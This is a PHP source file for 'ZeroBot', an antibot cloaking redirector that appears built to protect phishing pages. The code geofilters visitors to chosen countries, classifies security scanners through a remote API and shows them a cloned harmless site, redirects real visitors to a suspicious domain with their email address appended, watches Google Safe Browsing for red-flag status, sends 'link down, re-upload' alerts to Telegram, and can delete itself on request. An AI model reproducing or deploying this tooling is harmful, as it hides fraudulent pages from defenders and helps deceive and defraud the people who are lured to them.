<?php

/*
    Antibot Application (ZeroBot)
    This Tool is not for illegal use
    @ Copyright @brendonurie2000
	https://zerobot.info

    *** Version 3  AD Marketer ***
*/

$license_key = "s91jgfdjkgtk5h3hss5azp1xvfdrp3hn"; // [REQUIRED]

$redirect = "https://finnn.terrellcountygeorgia.it.com"; // URL or FILE [REQUIRED]


$parameter = 1; // [REQUIRED]

/*
	1 : Check Bots And Countries.
	2 : Check Only Bots.
	3 : Check Only Countries.
	4 : Allow All Visitors.
*/

$_COUNTRY_ALLOWED = ["ma", "fr"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]

$redirection_link_check = false; // Check Your Page If Still Uploaded

$check_red_page = false; // Check The Redirect If Red Flag

$authentification = false; // Not necessary

$cloaker = [
    "url_to_grab" => "https://www.groovygratitude.com", // Change the link you want to grap it in your link ( if t)
];

$auto_grabber = false; // Activate Auto Grab Email

$location_bots = "https://google.com"; // Send The Bots To This Link ( If Cloaker Url Empty )

$view_file_name = "views.php"; // Type PHP Extension Will Be Added Auto Per Example : views.php

$token_chat = "TOKEN"; // Your Token To Receive Rapports

$chatid = "CHAT ID"; // Your ChatID To Receive Rapports


$captcha = false; // Allow ZeroBot Captcha

$remove_visitors_duplicate = false; // Visitors Remove Duplicate

ZEROBOT::PHP_VERSION_SET();
ZEROBOT::__DEFINED();

class ZEROBOT
{
    public $api = "https://zerobot.info/api/v2/antibot"; // Don't Change The Antibot Server
    public $captcha_api = "https://zerobot.info/api/v2/captcha"; // Don't Change The Antibot Server Captcha
    public $api_geo = "https://zerobot.info/api/v2/getinfo"; // Don't Change The Antibot Server GeoLocation
    public $telegram = "https://api.telegram.org/bot"; // Telegam Api
    public $google_api = "https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site="; // Google API To Check Down Links

    public $token;
    public $chatid;
    public $keys;
    public $message;
    public $vu_filename;
    public $ip;
    public $license_key;

    public $data_show = '<?php error_reporting(0); session_start(); $filename = "BASENAME"; $file = explode("onload", file_get_contents(basename($_SERVER["PHP_SELF"])))[2];$human = substr_count($file, "#00a300");$bots = substr_count($file, "#FF0000");?><head><title>ZeroBot Statistique</title>  <link rel="icon" type="image/png" href="https://zerobot.info/dashboard/assets/images/favicon.ico">  <script src="https://zerobot.info/assets/js/script.js" crossorigin="anonymous"></script><style>table {font-size: 13px}</style><link href="https://cdn.jsdelivr.net/npm/@coreui/coreui-pro@4.6.4/dist/css/coreui.min.css" rel="stylesheet"integrity="sha384-N6/iVUKuB1Y9fhC3xnBbekegSwfXwMNEIvMxNyYLO6z9vmfxMyEwPNsH0k+p4beB" crossorigin="anonymous"><!-- Option 2: CoreUI PRO for Bootstrap Bundle with Popper --><script src="https://cdn.jsdelivr.net/npm/@coreui/coreui-pro@4.6.4/dist/js/coreui.bundle.min.js"integrity="sha384-J57aCZcRcbraFuQaL18wp1fDE0fLyO7Il/jKACMovk4ddxUIvjRK5ZZnqcHuBF/T" crossorigin="anonymous"></script></script></head><header class="header"><a class="header-brand" href="https://zerobot.info"><img src="https://zerobot.info/dashboard/assets/images/favicon.ico" alt="" width="34" height="30"class="d-inline-block align-top" alt="CoreUI Logo">ZeroBot</a><a class="dropdown-toggle text-white btn btn-success" href="#" role="button" data-coreui-toggle="dropdown" aria-expanded="false">Options</a><ul class="dropdown-menu">  <li><a class="dropdown-item" href="<?php echo $filename . "?delete" ?>">Reset Traffic</a></li>  <li><a class="dropdown-item" href="<?php echo $filename . "?del" ?>">Delete Antibot File</a></li></ul><ul class="nav nav-pills nav-justified"><button type="button" class="text-white  btn btn-secondary m-1"><svg width="20px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 21H7.8C6.11984 21 5.27976 21 4.63803 20.673C4.07354 20.3854 3.6146 19.9265 3.32698 19.362C3 18.7202 3 17.8802 3 16.2V3M6 15L10 11L14 15L20 9M20 9V13M20 9H16"stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg> <span class="cil-contrast"></span> <?php echo $_SESSION["plan"]; ?></button><button type="button" class="text-white btn btn-danger m-1"><svg fill="#000000" width="20px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21.928 11.607c-.202-.488-.635-.605-.928-.633V8c0-1.103-.897-2-2-2h-6V4.61c.305-.274.5-.668.5-1.11a1.5 1.5 0 0 0-3 0c0 .442.195.836.5 1.11V6H5c-1.103 0-2 .897-2 2v2.997l-.082.006A1 1 0 0 0 1.99 12v2a1 1 0 0 0 1 1H3v5c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5a1 1 0 0 0 1-1v-1.938a1.006 1.006 0 0 0-.072-.455zM5 20V8h14l.001 3.996L19 12v2l.001.005.001 5.995H5z" /><ellipse cx="8.5" cy="12" rx="1.5" ry="2" /><ellipse cx="15.5" cy="12" rx="1.5" ry="2" /><path d="M8 16h8v2H8z" /></svg><span class="cil-contrast"></span> <?php echo $bots; ?></button><button  onclick="showHuman()"  type="button" class="text-white btn btn-success m-1"><svg fill="#000000" width="20px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M16 15.503A5.041 5.041 0 1 0 16 5.42a5.041 5.041 0 0 0 0 10.083zm0 2.215c-6.703 0-11 3.699-11 5.5v3.363h22v-3.363c0-2.178-4.068-5.5-11-5.5z" /></svg><span class="cil-contrast"></span> <?php echo $human; ?></button><button type="button" class="text-white  btn btn-warning m-1"><svg width="20px" viewBox="0 0 24 24" fill="none"xmlns="http://www.w3.org/2000/svg"><path d="M3 5.5L5 3.5M21 5.5L19 3.5M9 12.5L11 14.5L15 10.5M20 12.5C20 16.9183 16.4183 20.5 12 20.5C7.58172 20.5 4 16.9183 4 12.5C4 8.08172 7.58172 4.5 12 4.5C16.4183 4.5 20 8.08172 20 12.5Z"stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg><span class="cil-contrast">  <?php echo $_SESSION["days_left"]; ?> </span> </button></ul></header><script type="text/JavaScript">function AutoRefresh( t ) {setTimeout("location.reload(true);", t);}</script><body onload="JavaScript:AutoRefresh(30000);"><table class="table"><thead class="table-dark"><tr><th scope="col">IP</th><th scope="col">Time</th><th scope="col">Machine</th><th scope="col">ISP</th><th scope="col">Hostname</th><th scope="col">Country</th><th scope="col">Type</th></tr></thead>';

    public $country_code;
    public $country_name;
    public $isp;
    public $hostname;
    public $useragent;
    public $redirect;
    public $rm_db;

    public function __construct(
        $redirect,
        $parameter,
        $authentification,
        $token,
        $chatid,
        $vu_filename,
        $remove_visitors_duplicate,
        $auto_grabber
    ) {
        global $captcha, $license_key, $redirect;
        $this->token = $token;
        $this->chatid = $chatid;
        $this->vu_filename = $vu_filename;
        $this->license_key = $license_key;
        $this->useragent = $_SERVER["HTTP_USER_AGENT"];
        $this->rm_db = $remove_visitors_duplicate;
        $this->data_show = str_replace(

            "BASENAME",
            basename(__FILE__),
            $this->data_show
        );

        if (
            empty($license_key) ||
            empty($redirect) ||
            strlen($license_key) != 32
        ) {
            echo "<script>alert('Check Your Entries And Try Again !')</script>";
            exit();
        }
        if (!empty($redirect)) {
            if (empty($parameter) or !is_numeric($parameter)) {
                $parameter = 1;
            }
            $this->redirect = $redirect;
            
            $this->_ACCESS();

            $this->_ADD_EXT_LINK($authentification, $license_key);

            $this->_IP_ADDRESS_FINDER();

            $this->_GEOLOCATION($license_key);

            $this->_GOOGLE_FLAG();

            $this->_CHECK_LINK($license_key);

            $this->_AUTO_GRABBER($auto_grabber);
            
            $this->captcha_redirection();
            
            $_SESSION['redirect'] = $this->redirect;
            
            switch ($parameter) {
                case "1":
                    if ($this->_COUNTRY_ALLOWED() == true) {

                        if ($this->_ZEROBOT_MANAGER($captcha) == true) {

                            if ($captcha) {

                                $this->captcha_resolve();

                            } else {

                                header("location:" . $this->redirect);
                                exit();
                            }
                        }
                    }
                    break;
                case "2":
                    if ($this->_ZEROBOT_MANAGER($captcha) == true) {

                        if ($captcha) {
                            $this->captcha_resolve();
                        } 
                        else {

                            header("location:" . $this->redirect);
                            exit();
                        }
                    }
                    break;
                case "3":
                    if ($this->_COUNTRY_ALLOWED() == true) {

                        $this->write_vues("Human");

                        if ($captcha) {

                            $this->captcha_resolve();
                            
                        } else {
                            header("location:" . $this->redirect);
                            exit();
                        }
                    }
                    break;
                default:
                    $this->write_vues("Allowed");
                    if ($captcha) {
                        $this->captcha_resolve();
                    } else {
                        header("location:" . $this->redirect);
                        exit();
                    }
                    break;
            }
        } else {
            echo "Link Empty";
        }
    }

    public function _AUTO_GRABBER($auto_grabber)
    {
        if ($auto_grabber && isset($_GET["email"]))
        {
            $this->redirect .= "#" . $_GET["email"];
        }

    }
    public static function PHP_VERSION_SET()
    {
        if ((int) phpversion()[0] < 5) {
            echo "PHP Version Required 5+";
            exit();
        }
    }
    public function _ACCESS()
    {
        if (isset($_GET["del"])) {
            unlink(basename(__FILE__));
            echo "✅ Antibot File Deleted : " . basename(__FILE__);
            exit();
        }
        if (isset($_GET["check"])) {
            print "AccessID923487";
            exit();
        }
        if (isset($_GET["delete"])) {
            $file_handle = fopen($this->vu_filename, "w");
            $f = fopen($this->vu_filename, "a");
            fwrite($f, $this->data_show);
            fclose($f);
            header("location:" . $this->vu_filename);
            exit();
        }
    }
    public static function __DEFINED()
    {
        session_start();
        error_reporting(0);
        ini_set("display_errors", 0);
        ini_set("display_startup_errors", 0);
        header("Content-type: text/html; charset=UTF-8");
        define("key_id", "AccessID923487");
    }
    private function _CURL_ACCESS($url, $post)
    {
        $this->keys = curl_init();
        if (isset($post) && is_array($post)) {
            curl_setopt(
                $this->keys,
                CURLOPT_URL,
                $url . "?" . http_build_query($post)
            );
        } else {
            curl_setopt($this->keys, CURLOPT_URL, $url);
        }
        
        curl_setopt($this->keys, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($this->keys, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($this->keys, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($this->keys, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($this->keys, CURLOPT_AUTOREFERER, true);
        curl_setopt($this->keys, CURLOPT_TIMEOUT, 20);
        curl_setopt($this->keys, CURLOPT_HTTPHEADER, [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        ]);


        
        curl_setopt($this->keys, CURLOPT_RETURNTRANSFER, true);
        $return = curl_exec($this->keys);
        if (empty($return)) {
            @file_get_contents($url);
        } else {
            return $return;
        }
    }
    public function _COUNTRY_ALLOWED()
    {
        global $_COUNTRY_ALLOWED;
        $country_name = strtolower($this->country_code);
        if (in_array($country_name, $_COUNTRY_ALLOWED)) {
            return 1;
        } else {
            $this->write_vues("Country Denied");
            $this->_BOT_REDIRECTION();
            return 0;
        }
    }
    public function _LICENSE_VERIFICATION($data_json_decoded)
    {
        if (
            isset($data_json_decoded["query"]) &&
            $data_json_decoded["query"] == "failed"
        ) {
            echo "<script>alert('" .
                htmlspecialchars(
                    $data_json_decoded["reason"],
                    ENT_QUOTES,
                    "UTF-8"
                ) .
                "');</script>";
            exit();
        }
    }
    private function _GEOLOCATION($license_key)
    {
        $post_app = ["license" => $license_key, "ip" => $this->ip];
        $data_geo = $this->_CURL_ACCESS($this->api_geo, $post_app);
        $data_json_decoded = @json_decode($data_geo, true);
        $this->_LICENSE_VERIFICATION($data_json_decoded);
        $this->country_code = $data_json_decoded["country_code"];
        $this->country_name = $data_json_decoded["country"];
        $this->isp = $data_json_decoded["isp"];
        $this->hostname = $data_json_decoded["hostname"];
    }
    public function apply_cloaker($url)
    {
        global $location_bots, $html;

        $url = rtrim($url, '/') . '/'; 

        $html = $this->_CURL_ACCESS($url, null);
        if ($html === false) {
            header("Location: " . $location_bots);
            exit();
        }

        $doc = new DOMDocument();
        libxml_use_internal_errors(true);
        $doc->loadHTML($html);
        libxml_clear_errors();
        $xpath = new DOMXPath($doc);

        $key_app = array(
            "//link[@rel='stylesheet']" => "href",
            "//script[contains(@src, '.js')]" => "src",
            "//img" => "src",
            "//a" => "href",
            "//link[@rel='icon']" => "href"
        );

        foreach ($key_app as $xpathQuery => $attribute) {
            foreach ($xpath->query($xpathQuery) as $element) {
                if ($element->hasAttribute($attribute)) {
                    $oldSourceLink = $element->getAttribute($attribute);

                    if (substr($oldSourceLink, 0, 4) != 'http') {
                        if (substr($oldSourceLink, 0, 2) === '//') {
                            $oldSourceLink = ($url[4] === 's' ? 'https:' : 'http:') . $oldSourceLink;
                        } else {
                            $oldSourceLink = ltrim($oldSourceLink, './');
                            $oldSourceLink = $url . $oldSourceLink;
                        }
                        $element->setAttribute($attribute, $oldSourceLink);
                    }   
                }
            }
        }

        $html = $doc->saveHTML();
        
        echo $html;
        exit();
    }

    
    public function write_vues($check)
    {
        if (!file_exists($this->vu_filename)) {
            $f = fopen($this->vu_filename, "a");
        }
        switch ($check) {
            case "Human":
                $color = "#00a300";
                break;
            case "Bot":
                $color = "#FF0000";
                break;
            case "Country Denied":
                $color = "#DAA520";
                break;
            case "Allowed":
                $color = "black";
                break;
        }
        $this->_HTML_VIEWS();
        $time = date("d/m/Y h:i:s A");
        $this->_USER_OS();
        $ip_address = $this->ip;
        $machine = $this->useragent;
        $country = $this->country_name;
        $isp = $this->isp;
        $hostname = $this->hostname;
        if (empty($hostname)) {
            $hostname = $this->ip;
        }
        $data_to_put =
            "<tr><th scope='row'>$ip_address</th><td>$time</td><td>$machine</td><td>$isp</td><td>$hostname</td><td><img style='padding-right:5px' width='30px' src='https://flagpedia.net/data/flags/icon/108x81/" .
            strtolower($this->country_code) .
            ".webp'>$country</td><td><b><p style='color:$color'>$check</p></b></td></tr>";
        if ($this->rm_db) {
            $this->_ONE_IP($ip_address, $data_to_put);
        } else {
            $file = fopen($this->vu_filename, "a");
            fwrite($file, (string) $data_to_put . "\n");
            fclose($file);
        }
    }
    public function _ONE_IP($ip_address, $data_to_put)
    {
        if (
            is_readable($this->vu_filename) &&
            !preg_match("/$ip_address/", file_get_contents($this->vu_filename))
        ) {
            $file = fopen($this->vu_filename, "a");
            fwrite($file, (string) $data_to_put . "\n");
            fclose($file);
        }
    }
    public function _CHECK_LINK($license_key)
    {
        global $redirection_link_check;
        if (preg_match("/key/", $this->redirect)) {
            $redirect = str_replace(
                "?key=" . $license_key,
                "",
                $this->redirect
            );
        } else {
            $redirect = $this->redirect;
        }
        if ($redirection_link_check == true) {
            $data_check = $this->_CURL_ACCESS($redirect . "?check", null);
            if (!preg_match("/" . key_id . "/", $data_check)) {
                $this->rapport_template(0, $redirect);
            }
        }
        
    }
    public function captcha_redirection()
    {
        if (isset($_GET["authorize"])) {
            $array_post = [
                "license" => $this->license_key,
                "ip" => $this->ip,
                "useragent" => $this->useragent,
            ];
            $this->_CURL_ACCESS($this->captcha_api, $array_post);

            header("location:" . $_SESSION["redirect"]);
            exit();
        }
    }
    private function full_link_get()
    {
        if (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on") {
            $link = "https";
        } else {
            $link = "http";
        }
        $link .= "://";
        $link .= $_SERVER["HTTP_HOST"];
        $link .= $_SERVER["PHP_SELF"];
        return $link;
    }
    public function captcha_resolve()
    {
        global $captcha;
        if ($captcha) {
            if (isset($_SESSION["color"]) && isset($_SESSION["logo"])) {
                echo '<html><head><link rel="icon" type="image/x-icon" href="' .
                    $_SESSION["logo"] .
                    '"><meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="stylesheet" href="https://zerobot.info/captcha/slider.css">    <!-- CSS only -->    <link rel="stylesheet" href="https://zerobot.info/captcha/captcha.css" />    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />    <!-- JavaScript Bundle with Popper -->    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script><script src="https://kit.fontawesome.com/1cf483120b.js" crossorigin="anonymous"></script><title>Captcha Verification</title></head><body><div class="container"><header><img width="80px" src="' .
                    $_SESSION["logo"] .
                    '"></header><p align="center" style="margin-bottom:20px">Verify you are human</p><div id="captcha"></div></div><script src="https://zerobot.info/captcha/captcha.js"></script></body></html>';
            } else {
                echo '<html><head><link rel="icon" type="image/x-icon" href="https://zerobot.info/captcha/favicon.png"><meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="stylesheet" href="https://zerobot.info/captcha/slider.css">    <!-- CSS only -->    <link rel="stylesheet" href="https://zerobot.info/captcha/captcha.css" />    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />    <!-- JavaScript Bundle with Popper -->    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script><script src="https://kit.fontawesome.com/1cf483120b.js" crossorigin="anonymous"></script><title>Captcha Verification</title></head><body><div class="container"><header><img width="80px" src="https://zerobot.info/captcha/favicon.png"></header><p align="center" style="margin-bottom:20px">Verify you are human</p><div id="captcha"></div></div><script src="https://zerobot.info/captcha/captcha.js"></script></body></html>';
            }
        }
    }

    private function rapport_template($action, $link)
    {
        global $redirection_link_check;

        $date = date("r", $_SERVER["REQUEST_TIME"]);
        if ($action) {
            $this->message = "❗️ Status : Down\n";
            $this->message .=
                "Link Redirect : " . $this->full_link_get() . "\n";
            $this->message .= "Link Server : " . $link . "\n";
            $this->message .= "Link Downed Is : " . $link . "\n";
            $this->message .= "Date : " . $date . "\n";
            $this->_TM_RAPPORT($this->message);
        }
        if ($redirection_link_check == 1 and !$action) {
            $this->message = "❗️ Status : You need to re-upload it now\n";
            $this->message .=
                "Link Redirect : " . $this->full_link_get() . "\n";
            $this->message .= "Link Server : " . $link . "\n";
            $this->message .= "Date : " . $date . "\n";
            $this->_TM_RAPPORT($this->message);
        }
    }
    private function _HTML_VIEWS()
    {
        if (empty($this->vu_filename)) {
            $this->vu_filename = "views";
        }
        if (file_exists($this->vu_filename)) {
            if (filesize($this->vu_filename) < 20) {
                $f = fopen($this->vu_filename, "w+");
                fwrite($f, $this->data_show);
                fclose($f);
            }
        } else {
            $f = fopen($this->vu_filename, "a");
            fwrite($f, $this->data_show);
            fclose($f);
        }
    }
    private function _IP_ADDRESS_FINDER()
    {
        foreach (
            [
                "HTTP_CLIENT_IP",
                "HTTP_X_FORWARDED_FOR",
                "HTTP_X_FORWARDED",
                "HTTP_X_CLUSTER_CLIENT_IP",
                "HTTP_FORWARDED_FOR",
                "HTTP_FORWARDED",
                "REMOTE_ADDR",
            ]
            as $key
        ) {
            if (array_key_exists($key, $_SERVER) === true) {
                foreach (explode(",", $_SERVER[$key]) as $ip_address) {
                    $ip_address = trim($ip_address);
                    if (
                        filter_var(
                            $ip_address,
                            FILTER_VALIDATE_IP,
                            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
                        ) !== false
                    ) {
                        $this->ip = $ip_address;
                        return;
                    } else {
                        $this->ip = "105.66.135.140";
                        return;
                    }
                }
            }
        }
    }
    private function _TM_RAPPORT($message)
    {
        if (
            !empty($message) and
            strlen($this->token) > 10 and
            strlen($this->chatid) > 5
        ) {
            $url =
                $this->telegram .
                $this->token .
                "/sendMessage?chat_id=" .
                $this->chatid .
                "&text=" .
                urlencode($message);
            $this->_CURL_ACCESS($url, null);
        }
    }
    private function _USER_OS()
    {
        if (array_key_exists("HTTP_USER_AGENT", $_SERVER)) {
            $array_key = preg_match("/\((.*?)\)/", $this->useragent, $code);
            $this->useragent = htmlspecialchars($code[1]);
        } else {
            $this->useragent = "UNKNOWN";
        }
    }
    public function _GOOGLE_FLAG()
    {
        global $check_red_page;
        if ($check_red_page) {
            $data_google = $this->_CURL_ACCESS(
                $this->google_api . $this->redirect,
                null
            );
            $data_google2 = $this->_CURL_ACCESS(
                $this->google_api . $this->full_link_get(),
                null
            );
            $ex = explode(",", $data_google);
            $ex2 = explode(",", $data_google2);
            if ($ex[1] == 2) {
                $this->rapport_template(1, $this->redirect);
            } elseif ($ex2[1] == 2) {
                $this->rapport_template(1, $this->full_link_get());
            }
        }
    }
    public function _ZEROBOT_MANAGER($captcha)
    {
        global $license_key;
        if (isset($captcha)) {
            $array_post = [
                "check_on" => $this->full_link_get(),
                "license" => $license_key,
                "ip" => $this->ip,
                "useragent" => $this->useragent,
                "captcha" => "",
            ];
        } else {
            $array_post = [
                "check_on" => $this->full_link_get(),
                "license" => $license_key,
                "ip" => $this->ip,
                "useragent" => $this->useragent,
            ];
        }

        $data_decoded = json_decode(
            $this->_CURL_ACCESS($this->api, $array_post),
            true
        );
        $this->_LICENSE_VERIFICATION($data_decoded);
        
        if (is_array($data_decoded)) {

            if (array_key_exists("query", $data_decoded)) {

                echo @json_encode($data_decoded);
                exit();

            } elseif (array_key_exists("username", $data_decoded)) {

                $_SESSION["days_left"] = $data_decoded["left"];

                $_SESSION["total_checked"] = $data_decoded["total"];

                $_SESSION["plan"] = $data_decoded["plan"];

                if ($data_decoded["is_bot"] == true) {

                    $this->write_vues("Bot");

                    $this->_BOT_REDIRECTION();

                    return 0;

                } elseif ($data_decoded["is_bot"] == false) {

                    $this->write_vues("Human");

                    if (array_key_exists("captcha", $data_decoded)) {

                        $_SESSION["color"] = $data_decoded["captcha"]["color"];
                        $_SESSION["logo"] = $data_decoded["captcha"]["logo"];

                    } else {
                        unset($_SESSION["color"]);
                        unset($_SESSION["logo"]);
                    }
                    return 1;
                }
            }
        }
    }
    public function _ADD_EXT_LINK($authentification, $license_key)
    {
        if ($authentification) {
            $this->redirect .= "/?key=" . $license_key;
        }
    }
    public function _BOT_REDIRECTION()
    {
        global $location_bots, $cloaker;
        if (isset($location_bots) && isset($cloaker["url_to_grab"])) {
            if (filter_var($cloaker["url_to_grab"], FILTER_VALIDATE_URL)) {
                $this->apply_cloaker($cloaker["url_to_grab"]);
            }
            if (filter_var($location_bots, FILTER_VALIDATE_URL)) {
                header("location:" . $location_bots);
                exit();
            }
        }
    }
}

new ZEROBOT(
    $redirect,
    $parameter,
    $authentification,
    $token_chat,
    $chatid,
    $view_file_name,
    $remove_visitors_duplicate,
    $auto_grabber
);
